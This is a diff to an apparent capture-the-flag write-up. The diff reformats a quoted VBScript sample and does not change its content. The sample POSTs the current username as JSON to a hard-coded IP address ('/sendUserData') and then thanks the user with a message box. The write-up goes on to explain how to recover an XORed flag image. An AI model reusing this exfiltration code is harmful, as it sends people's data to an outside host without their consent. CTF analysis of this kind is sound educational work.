@@ -24,7 +24,15 @@ https://download1647.mediafire.com/l188u2d532qg3fOoLpilcI89p0_h4E0cGLjk_uvBUiag7
 ```
 
 ```
-Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")                Dim url: url = "http://20.106.250.46/sendUserData"                              With http                                                                          Call .Open("POST", url, False)                                                  Call .SetRequestHeader("Content-Type", "application/json")                      Call .Send("{""username"":""" & strUser & """}")                             End With                                                                        res = Msgbox("Thank you for your cooperation!", vbOKOnly+vbInformation, "")
+Dim http:
+Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+Dim url: url = "http://20.106.250.46/sendUserData"
+With http
+    Call .Open("POST", url, False)
+    Call .SetRequestHeader("Content-Type", "application/json")
+    Call .Send("{""username"":""" & strUser & """}")
+End With
+res = Msgbox("Thank you for your cooperation!", vbOKOnly+vbInformation, "")
 ```
 
 The second one is a link to download a file named `defcon-flag.png.XORed` which, from the name, we can assume is our flag as an image that has been XORed. So now we just need to the key to XOR it back with. 
